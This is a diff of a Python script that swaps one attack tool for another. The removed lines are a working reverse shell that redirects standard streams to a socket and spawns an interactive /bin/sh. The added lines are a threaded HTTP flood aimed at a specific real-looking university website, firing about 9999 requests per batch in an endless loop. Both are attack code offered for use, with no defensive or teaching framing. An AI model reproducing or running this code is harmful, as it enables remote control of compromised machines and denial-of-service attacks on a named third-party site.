@@ -1,21 +1,30 @@
-import socket
-import subprocess
-import os
+import requests
+import threading
 
-def reverse_shell(ip, port):
-    # Create a socket object
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    # Connect to the specified IP address and port
-    s.connect((ip, port))
-    
-    # Redirect standard input, output, and error to the socket
-    os.dup2(s.fileno(), 0)  # Standard input
-    os.dup2(s.fileno(), 1)  # Standard output
-    os.dup2(s.fileno(), 2)  # Standard error
-    
-    # Start a shell
-    subprocess.call(["/bin/sh", "-i"])
+# Configuration
+url = 'http://pragati.rmkec.ac.in/'  # Replace with the target URL
+requests_per_second = 9999   # Number of requests to send per second   
+
+
+def send_request():
+    try:
+        response = requests.get(url)
+        print(f'Response code: {response.status_code}')
+    except requests.exceptions.RequestException as e:
+        print(f'Error: {e}')
+
+def worker():
+    while True:
+        threads = []
+        for _ in range(requests_per_second):
+            thread = threading.Thread(target=send_request)
+            thread.start()
+            threads.append(thread)
+
+        for thread in threads:
+            thread.join()
+
+         # Sleep for 1 second before sending the next batch
 
 if __name__ == "__main__":
-    # Replace 'your_ip' and 'your_port' with the IP and port you want to connect to
-    reverse_shell('0.0.0.0', 8085)
+    worker()
